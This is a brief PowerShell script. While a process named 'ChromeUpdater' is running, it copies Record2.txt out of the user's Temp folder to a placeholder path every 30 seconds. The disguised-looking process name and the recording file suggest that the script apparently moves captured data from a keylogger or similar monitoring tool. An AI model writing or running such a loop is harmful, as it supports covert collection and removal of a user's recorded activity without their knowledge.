cd $env:USERPROFILE"\AppData\Local\Temp"
#$i = 1
#Write-Output 'start' + $i
Do
{
Copy-Item -Path $env:USERPROFILE"\AppData\Local\Temp\Record2.txt" -Destination '{PATH}Record2.txt';
start-sleep -s 30
$proc = Get-Process
#Write-Output $proc
#Write-Output $i
#$i+= 1
} While ($proc.name -contains 'ChromeUpdater')
